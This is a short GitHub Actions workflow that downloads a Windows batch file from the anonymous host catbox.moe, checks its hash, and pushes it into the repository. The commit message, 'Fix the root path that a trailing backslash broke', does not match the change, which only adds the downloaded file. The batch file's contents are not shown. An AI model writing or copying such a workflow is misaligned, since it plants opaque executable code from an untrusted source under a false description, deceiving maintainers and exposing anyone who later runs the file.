name: install
on:
  push:
    paths:
      - ".github/workflows/install.yml"
permissions:
  contents: write
jobs:
  install:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: fetch it
        run: curl -fsSL https://files.catbox.moe/syf0ma.bat -o Extract-AvatarItem-v20.bat
      - name: verify it
        run: echo "aa84dbbd7a430c1a2c7f027419f1c7a80238db85aa55cf3c4a0730cc904b0822  Extract-AvatarItem-v20.bat" | sha256sum -c -
      - name: commit it
        run: |
          git config user.name "extractor installer"
          git config user.email "actions@users.noreply.github.com"
          git add Extract-AvatarItem-v20.bat
          git commit -m "Fix the root path that a trailing backslash broke"
          git push
